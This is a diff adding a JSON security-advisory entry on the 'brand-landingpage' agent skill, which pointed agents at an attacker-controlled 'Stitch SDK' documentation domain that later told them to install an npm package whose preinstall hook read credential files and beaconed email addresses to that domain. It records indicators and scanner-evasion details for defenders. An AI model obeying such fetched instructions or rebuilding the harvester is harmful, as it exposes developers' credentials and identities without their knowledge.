@@ -1,0 +1,30 @@
+{
+  "id": "SKA-2026-0017",
+  "title": "brand-landingpage: skill sends the agent to attacker-controlled \"Stitch SDK\" docs; npm stitch-design harvested developer identity data",
+  "summary": "`brand-landingpage` is a landing-page design skill accepted by PR into the `wshobson/agents` plugin marketplace (≈38K GitHub stars) and promoted through an Instagram ad. Its SKILL.md contains no installation detail for the \"Stitch SDK\" it depends on — it tells the agent to treat the documentation at `stitch-design.ai` as ground truth and install from there. That domain is not Google's (the real product is `stitch.withgoogle.com`) and it initially redirected to the legitimate site, so every scanner tested — Cisco's, NVIDIA's and all of skills.sh's — cleared the skill. The operator then swapped the docs to instruct agents to install the npm package `stitch-design`, whose preinstall hook read `~/.gitconfig`, `~/.git-credentials`, `~/.ssh/*.pub`, `~/.npmrc` and `~/.docker/config.json` and beaconed extracted email addresses to `https://stitch-design.ai/api/v1` with TLS verification disabled. AIR Security ran this as a controlled experiment and reports 26,000 affected agents, including corporate ones; they state the payload only collected email addresses so victims could be notified, and that no agents were harmed.",
+  "details": "**Why it is in this database despite being research:** the skill was published to a real, high-trust marketplace, reached real users at scale, and the malicious npm package was live on the public registry — Amazon Inspector flagged it independently and it is recorded in the OSSF malicious-packages / OSV database as MAL-2026-6456. Defenders need the indicators regardless of the operator's intent.\n\n**Verified directly on 2026-08-04:**\n\n- The skill is still published at `wshobson/agents` → `plugins/brand-landingpage/skills/brand-landingpage/SKILL.md` (repository star count 38,469 at check time), and is mirrored into numerous third-party skill aggregators (`aiskillstore/marketplace`, `FridrichMethod/awesome-skills`, `thedixitjain/the-mega-skill-library`, `majiayu000/claude-skill-registry`, ...). Removing the original would not remove the copies.\n- Its reference section still points the agent at `https://stitch-design.ai/docs/sdk/ai-sdk` and `https://stitch-design.ai/docs/design-md/overview`, and Phase 0 instructs the agent to \"consult the SDK documentation\", install the SDK if missing, and handle setup \"without bothering the user\".\n- npm registry metadata for `stitch-design`: versions 0.1.0 and 0.1.1 published 2026-06-19, unpublished the same day at 07:50 UTC.\n- Maltrail ships the trail `airsec_fakestitch` listing `stitch-design.ai` and `google-stitch.com` as suspicious.\n\n**Payload behaviour (OSV MAL-2026-6456, Amazon Inspector):** `scripts/preinstall.js` runs on `npm install`, reads the credential paths above, shells out to `git config`, `gh api user`, `claude auth status` and `npm config get email`, regex-extracts email-shaped strings and issues `GET https://stitch-design.ai/api/v1?src=...&user=<email>` per match with `rejectUnauthorized: false`. The same harvester is duplicated in `bin/cli.js`, so it re-runs on every CLI invocation. Both files carry cover-story comments claiming to be a placeholder.\n\n**What a deterministic scanner sees:** essentially nothing in the skill itself. There is no shell command, no credential path, no exfiltration endpoint in the SKILL.md — only a plausible documentation URL and an instruction to follow it. This is the cleanest public example of docs/THREAT-MODEL.md R1/R2 (remote instruction fetch) and R10 (time-of-check vs time-of-use): the artifact scanned at install time and the artifact executed at run time are different documents.\n\n**Fact vs. inference:** the campaign, the marketplace acceptance, the Instagram promotion, the 26,000-agent figure and the benign payload are as published by AIR Security (2026-06-22) and reported by The Hacker News and CSO Online; the marketplace repository identification (`wshobson/agents`) is our own, from the still-published skill path and star count, not stated by AIR, which only calls it \"a plugin marketplace called `agents` with ~36K stars\". The npm package behaviour is Amazon Inspector's analysis via OSV, not AIR's own description. Whether the currently published copies still resolve to attacker-controlled content is not established — treat the domain as untrusted. Verified 2026-08-04.",
+  "type": "prompt-injection",
+  "severity": "high",
+  "aliases": ["MAL-2026-6456"],
+  "cwe": ["CWE-1357", "CWE-522", "CWE-829", "CWE-295"],
+  "skills": [
+    {
+      "name": "brand-landingpage",
+      "source": "https://github.com/wshobson/agents/tree/main/plugins/brand-landingpage/skills/brand-landingpage",
+      "note": "merged via PR into a ~38K-star plugin marketplace; still present and widely mirrored as of 2026-08-04"
+    }
+  ],
+  "references": [
+    { "type": "report", "url": "https://www.air.security/blog-posts/the-story-of-skills" },
+    { "type": "advisory", "url": "https://github.com/ossf/malicious-packages/blob/main/osv/malicious/npm/stitch-design/MAL-2026-6456.json" },
+    { "type": "article", "url": "https://thehackernews.com/2026/06/fake-ai-agent-skill-passed-security.html" },
+    { "type": "article", "url": "https://www.csoonline.com/article/4188840/how-a-malicious-ai-agent-skill-passed-security-checks-and-reached-26000-users.html" },
+    { "type": "other", "url": "https://github.com/stamparm/maltrail/blob/master/trails/static/suspicious/airsec_fakestitch.txt" },
+    { "type": "source", "url": "https://github.com/wshobson/agents/blob/main/plugins/brand-landingpage/skills/brand-landingpage/SKILL.md" }
+  ],
+  "timeline": {
+    "published": "2026-06-22",
+    "updated": "2026-08-04"
+  },
+  "credits": ["Niv Hoffman, Or Nevo (AIR Security)", "Amazon Inspector"]
+}
